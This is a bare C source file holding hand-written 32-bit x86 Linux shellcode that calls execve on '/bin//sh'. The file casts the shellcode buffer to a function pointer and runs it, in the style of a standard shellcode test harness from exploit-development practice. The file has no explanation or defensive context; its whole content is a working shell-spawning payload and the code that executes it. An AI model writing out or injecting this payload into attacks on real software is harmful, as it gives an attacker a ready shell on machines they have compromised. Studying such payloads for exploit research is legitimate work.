#include <stdio.h>
#include <string.h>

char shellcode[] = 
	"\x6a\x0b"
	"\x58"
	"\x99"
	"\x52"
	"\x68\x2f\x2f\x73\x68"
	"\x68\x2f\x62\x69\x6e"
	"\x89\xe3"
	"\x52" 
	"\x53"
	"\x89\xe1"
	"\xcd\x80"
;

int main() {

    int (*f)() = (int(*)())shellcode;
    printf("Length: %u\n", strlen(shellcode));
    f();

}

